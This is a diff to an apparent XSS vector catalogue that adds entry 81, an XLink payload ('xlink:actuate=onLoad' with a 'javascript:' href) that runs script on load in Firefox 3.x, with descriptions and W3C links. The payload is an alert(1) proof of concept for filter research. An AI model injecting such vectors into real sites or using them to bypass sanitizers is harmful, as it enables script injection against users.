@@ -2540,5 +2540,34 @@ var items =
         },
         'tags'       : ['xss', 'javascript', 'css', 'expression', 'unicode', 'halfwidth', 'fullwidth', 'internet explorer'],
         'reporter'   : '.mario'
+    },
+    { /* ID 81 - Active JavaScript execution via XLinks */
+        'id'         : 81,
+        'category'   : 'xml', 
+        'name'       : {
+            'en' : 'Active JavaScript execution via XLinks',
+            'ja' : '',
+            'ru' : 'Активный скриптинг с помощью XLinks',
+            'de' : ''
+        },
+        'data'       : '<x xmlns:xlink="http://www.w3.org/1999/xlink" xlink:actuate="onLoad" xlink:href="javascript:alert(1)" xlink:type="simple">XXX</x> ',
+        'description': {
+            'en' : 'FF support the attribute "xlink:actuate" and can display xlink without additional styles and namespaces "html".',
+            'ja' : '',
+            'ru' : 'FF поддерживает атрибут "xlink:actuate" и может отобразить xml-ссылку без дополнительных стилей и пространства имен "html".',
+            'de' : ''
+        },
+        'urls'    : ['http://www.w3.org/TR/xlink/', 'http://www.w3.org/TR/2010/REC-xlink11-20100506/'],
+        'howtofix'   : {
+            'en' : '',
+            'ja' : '',
+            'ru' : '',
+            'de' : ''
+        },                        
+        'browsers'   : {
+            'firefox': ['3.0', '3.5', '3.6', '3.7']
+        },
+        'tags'       : ['xss', 'javascript', 'xlinks', 'firefox', 'xml'],
+        'reporter'   : 'LeverOne, .mario'
     }
 ]
